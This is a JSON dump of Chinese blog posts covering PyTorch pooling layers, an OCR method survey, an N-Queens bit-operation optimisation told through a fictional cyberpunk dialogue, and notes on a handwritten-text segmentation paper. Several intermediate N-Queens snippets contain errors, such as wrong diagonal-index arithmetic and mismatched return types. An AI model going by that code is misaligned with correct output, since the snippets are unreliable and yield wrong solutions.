通过将核张量K与K+1（K中每个元素加）和K+2连接起来，构造了一个具有个输出通道的卷积核。K = torch.stack((K, K + 1, K + 2), 0)print(K.shape)print(corr2d_multi_in_out(X, K)) 123456789torch.Size([3, 2, 2, 2])tensor([[[ 56., 72.], [104., 120.]], [[ 76., 100.], [148., 172.]], [[ 96., 128.], [192., 224.]]]) 池化层 事实上卷积对位置是敏感的，但我们并不希望卷积层对位置过于敏感，因为实际照片中通常回出现歪斜，模糊，昏暗，过曝等等情况。 因此为了解决这个问题，卷积层引入了池化层来辅助 二维最大池化 池化层与卷积层类似，同样具有填充和步幅 但没有可以学习的参数 在每个输入通道应用池化层以获得相应的输出通道 输出通道数=输入通道数 平均池化层 最大池化层：每个窗口中最强的模式信号 平均池化层：将最大池化层中的“最大”操作替换为“平均” 代码实现 1234567891011121314151617181920212223import torchfrom torch import nnfrom d2l import torch as d2l# TODO: 单通道单输出池化层def pool2d(X, pool_size, mode=&#x27;max&#x27;): p_h, p_w = pool_size Y = torch.zeros((X.shape[0] - p_h + 1, X.shape[1] - p_w + 1)) for i in range(Y.shape[0]): for j in range(Y.shape[1]): if mode == &#x27;max&#x27;: Y[i, j] = X[i: i + p_h, j: j + p_w].max() elif mode == &#x27;avg&#x27;: Y[i, j] = X[i: i + p_h, j: j + p_w].mean() return Y# TODO: 池化层测试X = torch.tensor([[0.0, 1.0, 2.0], [3.0, 4.0, 5.0], [6.0, 7.0, 8.0]])print(pool2d(X, (2, 2)))print(pool2d(X, (2, 2), &#x27;avg&#x27;)) 1234tensor([[4., 5.], [7., 8.]])tensor([[2., 3.], [5., 6.]]) 使用Pytorch的接口可以设置步幅和填充 12345678910# TODO: Pytorch步幅填充调节X = torch.arange(16, dtype=torch.float32).reshape((1, 1, 4, 4))print(X)# TODO: Pytorch中的最大池化层，该层默认步幅=核大小pool2d = nn.MaxPool2d(3)print(pool2d(X))# TODO: 手动设置步长和填充pool2d = nn.MaxPool2d(3, padding=1, stride=2)print(pool2d(X)) 1234567tensor([[[[ 0., 1., 2., 3.], [ 4., 5., 6., 7.], [ 8., 9., 10., 11.], [12., 13., 14., 15.]]]])tensor([[[[10.]]]])tensor([[[[ 5., 7.], [13., 15.]]]]) 对于多通道的情况： 123456# TODO: 多通道X = torch.cat((X, X + 1), 1)print(X)pool2d = nn.MaxPool2d(3, padding=1, stride=2)print(pool2d(X)) 1234567891011121314tensor([[[[ 0., 1., 2., 3.], [ 4., 5., 6., 7.], [ 8., 9., 10., 11.], [12., 13., 14., 15.]], [[ 1., 2., 3., 4.], [ 5., 6., 7., 8.], [ 9., 10., 11., 12.], [13., 14., 15., 16.]]]])tensor([[[[ 5., 7.], [13., 15.]], [[ 6., 8.], [14., 16.]]]])","categories":[{"name":"硕士研究生","slug":"硕士研究生","permalink":"http://enderxiao.github.io/categories/%E7%A1%95%E5%A3%AB%E7%A0%94%E7%A9%B6%E7%94%9F/"},{"name":"机器学习","slug":"机器学习","permalink":"http://enderxiao.github.io/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"机器学习入门","slug":"硕士研究生/机器学习入门","permalink":"http://enderxiao.github.io/categories/%E7%A1%95%E5%A3%AB%E7%A0%94%E7%A9%B6%E7%94%9F/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8/"}],"tags":[{"name":"环境搭建","slug":"环境搭建","permalink":"http://enderxiao.github.io/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"name":"PyTorch","slug":"PyTorch","permalink":"http://enderxiao.github.io/tags/PyTorch/"},{"name":"Python","slug":"Python","permalink":"http://enderxiao.github.io/tags/Python/"},{"name":"CUDA","slug":"CUDA","permalink":"http://enderxiao.github.io/tags/CUDA/"}]},{"title":"OCR综述","slug":"OCR综述","date":"2022-11-08T11:45:48.000Z","updated":"2024-07-30T11:26:33.912Z","comments":true,"path":"2022/11/08/OCR综述/","permalink":"http://enderxiao.github.io/2022/11/08/OCR%E7%BB%BC%E8%BF%B0/","excerpt":"","text":"OCR简介 ORC（Optical Character Recognition）光学字符识别，指提取图像中的文字信息，通常包括文本检测和文本识别 文本检测：将图片中的文字区域位置检测出来 文字识别：对文字区域中的文字进行识别 流程 传统方法 在深度学习之前，传统的OCR方法主要流程包括： 图像预处理：修正成像问题包括几何变换、去模糊、光线矫正 文本行检测：连通域、滑动窗口 单字符分割 单字符识别：图像分类、模板匹配 后处理 深度学习方法 文本行检测：输入图像、文字区域定位、文本行识别、输出 文本行识别：CNN、RNN、CTC ORC检测方法 EAST DB SAST 基于回归的方法 box回归 CTPN EAST 像素值回归 CRAFT SA-Text 基于分割方法 PSENet SegLink TextBoxes、TextBoxes++ R2CNN 论文 时间 数据集 code 特征 EAST CVPR2017 ICDAR2013、2015， COCO-Text，MSRA songdejia/EAST: This is a pytorch re-implementation of EAST: An Efficient and Accurate Scene Text Detector. (github.com) 端到端的快速文本检测方法，消除中间多个步骤，直接预测文本行 SegLink CVPR 2017 TextBoxes AAAI 2017 TextBoxes++ TIP 2018 R2CNN CoRR 2017 基于Faster RCNN的斜框检测：R2CNN - 知乎 (zhihu.com) PixelLink AAAI 2018 PSENet CVPR 2019 OCR识别方法 文字识别之前需要先对文字进行定位（文字检测主要有基于物体检测和基于分割两种方法） 文字识别主要分为三种类型： 单字分类：当能够定位出单字的时候，用图像分类法对单字进行分类 整词分类：当需要预测整词数量较少时，可对整词进行分类 整词识别：当有大量整词需要预测并且没有单字定位时，需要用解码序列的方法进行识别。 文字识别中最常用的时文字序列识别，使用场景更为广泛。 识别难点 主要难点在于输入与输出的对齐，如果我们每间隔单位n预测一个字符，那么可能出现多个n预测同一个字符，这样将导致结果出现重复字符，因此需要设计针对文字识别的编码算法来解决输入输出对齐问题。 可能解决OCR解码一对多问题的有以下三种方法（即端到端方法）： CTC Attention ACE 基于RNN进行文字识别的算法主要有两个： CNN + RNN + CTC（CRNN + CTC） CNN + Seq2Seq + Attention 论文 时间 数据集 code 特点 CRNN 2015 ICDAR 2013 meijieru/crnn.pytorch: Convolutional recurrent network in pytorch (github.com) 使用CNN提取图像卷积特征，然后使用LSTM提取卷积特征中的序列特征，最后使用CTC解决对齐问题 RARE CVPR 2016 对变形的图像文本效果很好，原因是输入图像首先被送入一个空间变换网络做处理 STAR-Net 2016 学习一个投影变换矩阵，将变形的文字变换为正常模样 SAR AAAI 2019 SRN 2020 端到端检测+识别 论文 时间 数据集 code 特点 E2E CRNN ICCV 2017 STN-OCR 2017 FOTS CVPR 2018 jiangxiluning/FOTS.PyTorch: FOTS Pytorch Implementation (github.com) Mask TextSpotter ECCV 2018 CharNet ICCV 2019 Mask TextSpotterV3 ECCV 2020 文本检测 难点 文本存在多种分布，排布形式多样 文本存在多个方向 多语言混合 技术 Faster RCNN 将目标检测的四个基本步骤： 候选区域生成 特征提取 分类 位置精修 整合到一个深度网络中，剔除计算冗余，并可通过GPU训练，进一步提高运行速度 Faster R-CNN论文笔记 CTPN 基于Faster RCNN，目前比较成熟的文本检测框架，精度较好，但检测时间较长。 预测文本的竖直方向上的位置，水平方向的位置不预测，对非水平的文字不能检测 CTPN TextBoxes\\TestBoxes++ 调整Anchor长宽比，适用于文字细长的特点，但针对小文本会有露检 SegLink CTPN + SSD，通常用于自然场景下，检测多角度文本 DMPNet 采用非矩形四边形选定Anchor进行检测，通过Monte-Carlo方法计算标注区域于矩形候选框和旋转候选框的重合度重新计算顶点坐标，得到非矩形四边形的顶点坐标。适用于自然场景下文本检测。 YOLO 文本检测时间短，精度好，但针对小目标效果一般，容易造成大范围漏检 EAST 采用FCN思路，做特征提取和特征融合，局部感知NMS阶段完成检测。网络的简洁使得检测准确率和速度都有进一步提升。（针对自然场景下使用较多） Pixel-Anchor 针对Anchor数量多引起文本出现的丢失问题，Pixel感受野不足引起长文本丢失情况，结合两者各自的优点，对长行的中文检测场景有较好的适应性。网络结构可以分为两部分，其中Pixel-based的方法对EAST的改进，anchor-based的方法对SSD的改进。前者主要为了检测中等文本，后者主要为了检测长行和较小的文本 IncepText 针对大尺度、长宽比及方向变化问题，借鉴GoogLeNet中的inception模块来解决这些问题。在inception结构中通过不同尺寸的卷积核设计达到检测不同大小和宽高比的文字，同时引入deformable卷积层操作和deformable PSROI pooling层提升任意方向文字的检测效果。 文本识别 技术 CNN + RNN + CTC(如CRNN) 目前使用最广泛的文本识别框架。需要自己构建字词库（包含常用字、各类字符） CNN(如Densenet) + CTC 效果一般，繁华能力较差。没有加入RNN的效果好 Tesserocr(Tesseract) 使用比较广泛的一种开源识别框架，支持多语言多平台。Tesseract在识别清晰的标准中文字体效果还行，稍微复杂的情况就很糟糕（多字体等），而且花费的时间也很多。 RARE 主要用于识别变形的文本图像效果好，用于自然场景下文本识别。 FOTS EAST + CRNN，端到端OCR模型，检测和识别任务共享卷积特征层，节省计算时间，也比两阶段训练方式学习到更多图像特征。引入旋转感兴趣区域（RolRotate），可以从卷积特征图中产生出定向的文本区域，从而支持倾斜文本识别。 ASTER 模型主要分为两个部分，一个是矫正模型，一个是识别模型，矫正模型不需要矫正标注信息，对弯曲文本、透视文本有很好的矫正效果。识别模型中的CNN使用了ResNet的结构，最后的解码部分使用的是Sequence2Sequence机制来进行解码，不同于CRNN的CTCLoss 数据集 数据集 数据语言 大小 简要介绍 标注格式 下载地址 ICDAR_2013 语言: 英文 train:229 test:233 水平文本 x1 y1 x2 y2 text 下载链接. ICDAR_2015 语言: 英文 train:1000 test:500 倾斜文本 x1,y1,x2,y2,x3,y3,x4,y4,text 下载链接. ICDAR2017-MLT 语言: 混合 train:7200 test:1800 多语言文本 x1,y1,x2,y2,x3,y3,x4,y4,text 下载链接. 提取码: z9ey ICDAR2017-RCTW 语言: 混合 train:8034 test:4229 主要是中文 x1,y1,x2,y2,x3,y3,x4,y4,&lt;识别难易程度&gt;,text 下载链接 天池比赛2018 语言: 混合 train:10000 test:10000 合成图像，产品描述，网络广告复杂排版，密集的小文本或多语言文本，水印等 x1,y1,x2,y2,x3,y3,x4,y4,text 检测。 识别 ICDAR2019-MLT 语言: 混合 train:10000 test:10000 水平文本每个连续的1000个图像包含一种主要语言的文本 x1,y1,x2,y2,x3,y3,x4,y4,语言类别,text 下载链接. 提取码: xofo ICDAR2019-LSVT 语言: 混合 train:30000 test:20000 中文街景图像 json格式标签 下载链接 ICDAR2019-ReCTS 语言: 混合 train:20000 test:5000 餐厅招牌上的中文文本 json格式标签 下载链接 ICDAR2019-ArT 语言: 混合 train:5603 test:4563 包含水平、多方向和弯曲等多种形状的文本 json格式标签 下载链接 Synth800k 语言: 英文 80k 每个文本实例均使用文本字符串、字级和字符级边界框进行注释 基于字符标注 下载链接 360万中文数据集 语言: 中文 360k 每个样本固定10个字符，字符随机截取自语料库中的句子 每张图片由10个字符构成 下载链接. 提取码:lu7m 中文街景数据集CTW 语言：中文 32285 包含平面文本，凸起文本，城市文本，农村文本，低亮度文本，远处文本，部分遮挡文本 基于字符标注的中文街景图片 下载链接 百度中文场景文字识别 语言: 混合 29万 由街景图片中的文字行区域（如店铺标牌、地标等）截取出来而形成图像经过一些预处理：将文字区域利用仿射变化，等比映射为一张高为48像素的图片 下载链接 MSRA-TD500 语言: 中英文 Training:300 Test:200 多方向文本检测大部分文本都在引导牌上 .gt格式标签 下载链接 Total-Text 语言: 英文 Training:1255 Test:300 弯曲文本 下载链接","categories":[{"name":"Python","slug":"Python","permalink":"http://enderxiao.github.io/categories/Python/"},{"name":"机器学习","slug":"机器学习","permalink":"http://enderxiao.github.io/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"计算机语言","slug":"计算机语言","permalink":"http://enderxiao.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%AF%AD%E8%A8%80/"},{"name":"研究生课程基础","slug":"研究生课程基础","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F%E8%AF%BE%E7%A8%8B%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"http://enderxiao.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"python","slug":"python","permalink":"http://enderxiao.github.io/tags/python/"},{"name":"基础","slug":"基础","permalink":"http://enderxiao.github.io/tags/%E5%9F%BA%E7%A1%80/"},{"name":"OCR","slug":"OCR","permalink":"http://enderxiao.github.io/tags/OCR/"}]},{"title":"LeetCode做题笔记————52位运算优化N皇后","slug":"LeetCode做题笔记————52位运算优化N皇后","date":"2022-10-17T06:53:11.000Z","updated":"2024-07-30T11:26:33.910Z","comments":true,"path":"2022/10/17/LeetCode做题笔记————52位运算优化N皇后/","permalink":"http://enderxiao.github.io/2022/10/17/LeetCode%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E2%80%94%E2%80%9452%E4%BD%8D%E8%BF%90%E7%AE%97%E4%BC%98%E5%8C%96N%E7%9A%87%E5%90%8E/","excerpt":"求解N皇后可行解个数的回溯优化","text":"求解N皇后可行解个数的回溯优化 序章 对于N皇后问题，如果我把棋盘的一行视为二进制的一位，用1表示皇后，0表示空棋盘，岂不是可以用二进制来优化N皇后问题 来自于一个躺在床上做题上瘾的本科生。他并不知道之后这一反复在他脑海中出现，却又没能被他真正实现过的想法，在不远的将来会成为又一击溃他精神的小石子。 Part 1 确实可以，不如你尝试一下 一个声音出现在他的脑海中 我试过了，并不比传统DFS快很多，只不过是把存储棋盘的方式从二维数组变换为某个具体的数。我并没能发挥出二进制表示全部优势。 他丧气的说到，大概是打算就此放弃。 获取我们可以从最传统的方式一步一步开始。也许并不是你没能发掘出二进制的优势，而是从传统方法到二进制，之间包含着很多处优化，而你却想一步优化到最佳 声音突然变的非常温柔，他听到这段话的感觉，就好像被软绵绵的云朵包裹住。 也许你说的对吧，但我现在没心情思考这些 他仍然没办法打起精神，屏幕上显示着LeetCode52题的提交页面——这是一个他曾经都不愿意看一眼的网站，但如今他不得不完成上面发布的任务，以便能在夜之城这个资本至上的城市中找到一份还算不错的工作。更讽刺的是从他那漏音却没法修的荒板耳机中传出的武侍乐队的朋克小曲。嘈杂的失真吉他仿佛在嘲笑他糟糕的生活。而他好像并不在意，手里仍在摆弄着那张他和他那迷人的女朋友的照片。 也许我无论怎么做，都无法真正让她像喜欢她前任一样喜欢我，就像无论我怎么努力，无论刷题到几点，无论打多少比赛，做多少题目，都无法改变我起步太晚，不可能在这么短时间里达到那些区域金选手的程度这一事实。最后不得不承认自己在自己热爱的事情上做的也不够好，不得不承认自己无法让爱的人爱自己一样。 说到这他的眉头微微抽动，手中把玩的照片也随之停顿了1/50秒。事实上他也是最近才开始听朋克乐的，以前的他一直无法接受朋克的粗糙，无法认同朋克所歌颂的内核。但他无法否认的是，他的命运已经变得朋克。就像反资本的朋克最终却只能屈服于资本一样。不彻底的反抗，不坚定的叛逆，最终只会让这座完全成熟的夜之城将你视为小打小闹的未成年。 这一短暂的迟疑没能逃过那个声音的追捕： 也许你的生活还没有糟到无法改变的地步，就像传统方法也没有你认为的那么不堪的地步。如果我们找不到可以优化的地方，那我们就试着找找传统方法中值得保留的地方。也许当我们做完这一件小事之后，你能有所改观。 声音逐渐变得令人讨厌。他扎实的抓住了一个绝望者的软肋，向他抛去希望的镰刀，甚至教他如何使用。在经历过那么多的希望破面，期待落空后，不彻底的反抗者总会相信下一个会有所不同不是吗。 那就来试试看吧 他放下手中的相册，双手悬浮于屏幕之上，虚拟键盘以完全贴合齐五指自然排列的方式出现在他的指尖。电脑随机扫面了他的虹膜。脑后的插头上，代表硬盘IO的指示灯重新开始闪烁。 我们从哪开始？ 既然要从传统方法上提取优点，那不如让我们先写一个最普通的N皇后解法吧，相信这个对你来说根本不算问题 ....我不需要没有意义的恭维 这类人都这样，口嫌体正直。 Part 2 题目描述 按照国际象棋的规则，皇后可以攻击与之处在同一行或同一列或同一斜线上的棋子。 n 皇后问题 研究的是如何将 n 个皇后放置在 n×n 的棋盘上，并且使皇后彼此之间不能相互攻击。 给你一个整数 n ，返回 n 皇后问题 的不同解法的数量。 Sample Input 14 Output 12 上述样例中，4皇后问题有以下两种解法，其中.表示空格，Q表示这一格上放着一枚皇后 123456789.Q.....QQ.....Q...Q.Q......Q.Q.. Part 3 传统解法 传统解法直接使用DFS就好，由于皇后可以横向攻击的特性，那么每一行只能放置一个皇后，因此我们只需要决定每一行的那一个皇后在哪就好了。那DFS的每一层递归就用来表示一行好了。 那么对于这一行的皇后，我怎么知道这个皇后应该放在哪呢？显然我们需要根据之前放好的行的皇后来判断，即对于第iii层的皇后，如果我们把他放在位置jjj，那么他需要满足以下条件： {map[x][y]≠Q(x&lt;i,y=j)map[x][y]≠Q(x&lt;i,abs(x−y)=abs(i−j))∉R\\begin{cases} map[x][y] \\neq Q &amp; ( x &lt; i, y = j) \\\\\\\\ map[x][y] \\neq Q &amp; (x &lt; i, abs(x - y) = abs(i - j)) \\notin R \\end{cases} ⎩⎪⎪⎨⎪⎪⎧​map[x][y]=Qmap[x][y]=Q​(x&lt;i,y=j)(x&lt;i,abs(x−y)=abs(i−j))∈/R​ 对于每一层，我们通过试探的方法看该层的这一位置能否防止，可以放置则进入下一层；无法放置则试探下一个位置。如果该层所有位置均无法放置，则返回上一层，修改上一层放置的位置。 最终代码如下： 点击解锁 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748bool judge(int layer, int pos, vector&lt;string&gt; board, int n)&#123; for (int i = 0; i &lt; board.size(); i++) &#123; if (board[i][pos] == &#x27;Q&#x27;) return false; &#125; for (int i = 1; i &lt;= board.size(); i++) &#123; int searchLayer = layer - i; int searchPos = pos + i; int searchPos2 = pos - i; // cout &lt;&lt; &quot;search: &quot; &lt;&lt; searchLayer &lt;&lt; &quot; &quot; &lt;&lt; searchPos &lt;&lt; &quot; &quot; &lt;&lt; searchPos2 &lt;&lt; endl; if (searchLayer &gt;= 0 &amp;&amp; searchPos &lt; n &amp;&amp; board[searchLayer][searchPos] == &#x27;Q&#x27;) return false; if (searchLayer &gt;= 0 &amp;&amp; searchPos2 &gt;= 0 &amp;&amp; board[searchLayer][searchPos2] == &#x27;Q&#x27;) return false; &#125; return true;&#125;void dfs(vector&lt;vector&lt;string&gt;&gt; &amp;ans, vector&lt;string&gt; boardNow, int layer, int n)&#123; if (layer == n) &#123; ans.push_back(boardNow); return; &#125; for (int i = 0; i &lt; n; i++) &#123; string layerNow(n, &#x27;.&#x27;); if (judge(layer, i, boardNow, n)) &#123; layerNow[i] = &#x27;Q&#x27;; boardNow.push_back(layerNow); dfs(ans, boardNow, layer + 1, n); boardNow.pop_back(); &#125; &#125;&#125;int solveNQueens(int n)&#123; vector&lt;vector&lt;string&gt;&gt; result; vector&lt;string&gt; boardNow; dfs(result, boardNow, 0, n); return result.size();&#125; Part 4 标记 可以肯定的是，传统方法中利用每一层只能放一个棋子的特点，避免了没必要的同层试探，并且递归的过程也写的很精简。但如果我说你这个算法很慢，你能告诉我大量的开销都花费到哪里去了吗 那个声音说到，似乎故意想把你的注意力吸引到dfs本身之外的地方。 嗯，当然可以，算法的时间开销很明显。由于试探冲突需要遍历所有已经放置的层，而冲突又大多发生在最底层，所以冲突的试探时间复杂度会达到O(n)，底层能放置的位置变少很可能需要遍历底层的每个位置，那么复杂度将会达到O(n^2) 他不甘挑衅，立马答到。 那如果使用试探每个位置的过程无法优化，我们能不能把判断是否冲突的时间复杂度降到O(1)呢 这样的话我需要记录那一条列、对角线、逆对角线上已经被放了皇后了。列好说，用一个数组标记列号即可，但主对角线和副对角线需要使用某种方式将其编号.... 嘴上念叨着，他又开始上下移动手指，让计算机显示出一行行霓虹代码。 对于对角线来说，根据正方形的对称性，一个包含n行n列的矩阵一共有： 2×n−12 \\times n - 1 2×n−1 这么多条对角线 那么对于主对角线，直接使用行和列的和就可以得到该位置所在的对角线的编号了。 而对于副对角线，使用同样的编码方式，但是我们认为编码应该是从左下角开始的，因此应取当前行号对于n的补数再与列号相加，即： n−1−row+coln - 1 - row + col n−1−row+col 现在就可以很轻松的完成这一工作了： 点击解锁 1234567891011121314151617181920212223242526272829303132333435363738394041bool visitCol[20]; // 记录已经使用过的列bool visitPie[20]; // 记录已经使用过的主对角线bool visitNa[20]; // 记录已经使用过的副对角线void dfs(vector&lt;vector&lt;string&gt;&gt; &amp;ans, vector&lt;string&gt; boardNow, int layer, int n)&#123; if (layer == n) &#123; ans.push_back(boardNow); return; &#125; for (int i = 0; i &lt; n; i++) &#123; int col = i; int mainCorner = layer * i; int subCorner = n - layer - 1 * i; if (visitCol[col] || visitPie[mainCorner] || visitPie[subCorner]) continue; visitCol[col] = true; visitPie[mainCorner] = true; visitNa[subCorner] = true; string layerNow(n, &#x27;.&#x27;); layerNow[i] = &#x27;Q&#x27;; boardNow.push_back(layerNow); dfs(ans, boardNow, layer + 1, n); boardNow.pop_back(); visitCol[col] = false; visitPie[mainCorner] = false; visitNa[subCorner] = false; &#125;&#125;vector&lt;vector&lt;string&gt;&gt; solveNQueens(int n)&#123; vector&lt;vector&lt;string&gt;&gt; result; vector&lt;string&gt; boardNow; memset(visitCol, 0, sizeof(visitCol)); memset(visitPie, 0, sizeof(visitPie)); memset(visitNa, 0, sizeof(visitNa)); dfs(result, boardNow, 0, n); return result;&#125; Part 5 空间 很好，时间上这个算法已经可以用优秀来形容了，但真的足够完美吗？ 声音仿佛带着一丝戏虐，仿佛他早已知道答案。 不用你提醒我。开三个bool数组太浪费空间了。 他仿佛被激怒了，已经很久没有这种渴望战胜某个人的感觉了。 对于每一个bool数组，变成语言会为其中的每一个数据分配至少1Byte的信息。但你我都知道，保存两个状态只需要一位就好了，也就是1bit。 因此完全可以使用一个整数来代替一个bool数组，标记时使用位运算即可。并且使用位运算进行查找比改变数组中的元素值快多了，这样一来就能接近完美了： 点击解锁 12345678910111213141516171819202122232425262728293031323334353637int col = 0; // 记录已经使用过的列int pie = 0; // 记录已经使用过的主对角线int na = 0; // 记录已经使用过的副对角线void dfs(vector&lt;vector&lt;string&gt;&gt; &amp;ans, vector&lt;string&gt; boardNow, int layer, int n)&#123; if (layer == n) &#123; ans.push_back(boardNow); return; &#125; for (int i = 0; i &lt; n; i++) &#123; int mainCorner = layer * i; int subCorner = n - layer - 1 * i; if (((col &gt;&gt; i) | (pie &gt;&gt; mainCorner) | (na &gt;&gt; subCorner)) &amp; 1) continue; string layerNow(n, &#x27;.&#x27;); layerNow[i] = &#x27;Q&#x27;; boardNow.push_back(layerNow); col ^= (1 &lt;&lt; i); pie ^= (1 &lt;&lt; mainCorner); na ^= (1 &lt;&lt; subCorner); dfs(ans, boardNow, layer + 1, n); boardNow.pop_back(); col ^= (1 &lt;&lt; i); pie ^= (1 &lt;&lt; mainCorner); na ^= (1 &lt;&lt; subCorner); &#125;&#125;vector&lt;vector&lt;string&gt;&gt; solveNQueens(int n)&#123; vector&lt;vector&lt;string&gt;&gt; result; vector&lt;string&gt; boardNow; dfs(result, boardNow, 0, n); return result;&#125; 这样就结束了吗？这么多移位操作，我看时间是应该是负优化 声音不再遮掩，直截了当的嘲讽起来。 ....... 他没有说话，而是接着动起了手中的键盘，对这份代码继续进行着修改。 上面提到的三份代码实际上都没有解决一个根本性的问题：深层试探失败的次数很多这一问题。 既然我们可以通过位运算直接判断出当前位置是不是已经不可以放了。那能否直接获得可以放的位置呢？ 位运算中有一种叫lowbit的操作，用于获取最低位1，并把其他位置0. 那么我将不可用位置取反，然后取lowbit即可得到一个可以使用的位置。 lowbit操作如下： 1234 a = 00110100 ~a = 11001011 -a = 11001100a &amp; -a = 00000100 那么代码就可以修改为如下形式： 对于col中，所有为1的位置表示不能放皇后。 对于pie中，对于当前行layer，经过该行的所有对角线的编号为[layer, n - 1 + layer]，为了和col的低n位对齐，我们将pie又移layer位，只有pie的低n位就也能表示能否放置了 对于na中，对于当前行layer，经过该行的所有对角线编号位[n−1−layer,2n−2−layer][n - 1 - layer, 2n - 2 - layer][n−1−layer,2n−2−layer]，因此我们对na进行类似的操作进行对其。 对pie和na进行对其时需要注意低n位左边的数据可能包含一些1，因此我们需要将其清0，只留下低n位的数据，因此需要与((1 &lt;&lt; n) - 1)进行与操作。 点击解锁 123456789101112131415161718192021222324252627282930int col = 0; // 记录已经使用过的列int pie = 0; // 记录已经使用过的主对角线int na = 0; // 记录已经使用过的副对角线void dfs(int &amp;res, int layer, int n)&#123; if (layer == n) &#123; res++; return; &#125; int available = ((1 &lt;&lt; n) - 1) &amp; ~(col | (pie &gt;&gt; layer) | (na &gt;&gt; (n - 1 - layer))); while (available &gt; 0) &#123; int p = available &amp; -available; available ^= p; // 选择这一位放置后续把这一位置0 col ^= p; pie ^= (p &lt;&lt; layer); na ^= (p &lt;&lt; (n - 1 - layer)); dfs(res, layer + 1, n); col ^= p; pie ^= (p &lt;&lt; layer); na ^= (p &lt;&lt; (n - 1 - layer)); &#125;&#125;vector&lt;vector&lt;string&gt;&gt; solveNQueens(int n)&#123; int ans = 0; dfs(ans,0, n); return ans;&#125; Part 6 完美 现在怎么样..... 他长舒了一口气，停下手指，看着眼前的一切。 太好了，已经接近完美了！过去的错误......我穿越那么多个时空，一次又一次的回到宇宙的各个时间点，终于完成了一项错误的纠正，事实证明，过去的错误时可以纠正的哈哈哈哈哈..... .......你...到底是谁.... 我是终将成为完美的人.... 说罢，声音向他的脑机中发送了一段代码，变无迹可寻… 原来还可以在形式上达到完美..... 这段代码正如下面描述的，将col、pie、na作为参数放在函数中。 那么没进行一层，对这三个参数进行一次左移操作即可，并且这样免去了每次对这三个参数复原的操作。 神秘代码 1234567891011121314151617181920212223void dfs(int &amp;res, int layer, int n, int col, int ld, int rd)&#123; // cout &lt;&lt; &quot;Layer: &quot; &lt;&lt; layer &lt;&lt; endl; if (layer == n) &#123; res++; return; &#125; // 左右移导致符号位发生改变，因此需要与全1进行与操作，保证有效位为低n位。 int bits = ~(col | ld | rd) &amp; ((1 &lt;&lt; n) - 1); while (bits &gt; 0) &#123; int pick = bits &amp; -bits; // 取最后一位1 dfs(res, layer + 1, n, col | pick, (ld | pick) &lt;&lt; 1, (rd | pick) &gt;&gt; 1); bits &amp;= bits - 1; // 将最后一位1置0 &#125;&#125;int totalNQueens(int n)&#123; int ans = 0; dfs(ans, 0, n, 0, 0, 0); return ans;&#125;","categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"http://enderxiao.github.io/categories/LeetCode/"}],"tags":[{"name":"LeetCode","slug":"LeetCode","permalink":"http://enderxiao.github.io/tags/LeetCode/"},{"name":"算法","slug":"算法","permalink":"http://enderxiao.github.io/tags/%E7%AE%97%E6%B3%95/"},{"name":"N皇后","slug":"N皇后","permalink":"http://enderxiao.github.io/tags/N%E7%9A%87%E5%90%8E/"},{"name":"算法优化","slug":"算法优化","permalink":"http://enderxiao.github.io/tags/%E7%AE%97%E6%B3%95%E4%BC%98%E5%8C%96/"},{"name":"位运算","slug":"位运算","permalink":"http://enderxiao.github.io/tags/%E4%BD%8D%E8%BF%90%E7%AE%97/"},{"name":"二进制","slug":"二进制","permalink":"http://enderxiao.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"},{"name":"DFS","slug":"DFS","permalink":"http://enderxiao.github.io/tags/DFS/"}]},{"title":"论文阅读--基于贪吃蛇算法和部首识别的手写文本切分","slug":"论文阅读-基于贪吃蛇算法和部首识别的手写文本切分","date":"2022-10-05T03:51:31.000Z","updated":"2024-07-30T11:26:33.939Z","comments":true,"path":"2022/10/05/论文阅读-基于贪吃蛇算法和部首识别的手写文本切分/","permalink":"http://enderxiao.github.io/2022/10/05/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-%E5%9F%BA%E4%BA%8E%E8%B4%AA%E5%90%83%E8%9B%87%E7%AE%97%E6%B3%95%E5%92%8C%E9%83%A8%E9%A6%96%E8%AF%86%E5%88%AB%E7%9A%84%E6%89%8B%E5%86%99%E6%96%87%E6%9C%AC%E5%88%87%E5%88%86/","excerpt":"","text":"Article 作者 题目 时间 期刊 董澳静 基于贪吃蛇算法和部首识别的手写文本切分 2022年 华南理工大学学报（自然科学版） Data 目的 解决对手写中文文本中： 文编交错 文编粘连 字内过分离 结论 以陕西省某高中试卷中1542行手写文本作为实验数据进行了算法验证，结果表明，该算法切分正确率可达到82.15％ 背景 [基于垂直投影的切分算法只能形成竖直路径，无法解决字符之间的交错、粘连 、重叠等问题](Captcha automatic segmentation and recognition based on improved vertical projection | IEEE Conference Publication | IEEE Xplore) 基于连通域的切分方法容易使连通元过碎，而真正粘连的字符，也不能通过连通域切分开 [滴水算法通过模拟水滴向低处滚动形成非线性切分路径，该算法效果优于竖直切分，但水滴在笔划内部形成垂直渗透，造成字符损失，不适合处理具有复杂结构的手写中文文本](改进滴水算法的黏连字符分割方法 - 中国知网 (cnki.net)) 方法 本算法通过模拟贪吃蛇在文本图像中爬行得到非线性切分路径. 爬行规则 爬行规则： 待切分文本图像中的字符作为障碍物 给定起点 爬行趋势为竖直方向 遇到障碍物沿障碍物边缘向下 进入字符凹陷区域，回溯 到达终点得到的有效路径形成原始切分路径 综上可知蛇的爬行不会穿过字符笔划，减少了字符损伤 爬行顺序： 表示当前位置 bbb表示black字符像素点 www表示white背景像素点 ★表示任意，即不影响决策 =&gt;表示像素转换，爬行策略优先级依次为pa−pgp_a - p_gpa​−pg​ 本算法对手写文本进行两次切分： 粗切分：分割非粘连字符和交错字符 二次切分：将1的结果结合宽高比阈值判断粘连字符，并以候选粘连点作为蛇爬行的起点，切分粘连字符 候选路径优化 基于多重约束规则的候选路径优化 爬行后的路径存在冗余，本文通过结合： 字符平均宽度 水平重叠率 分段投影特征 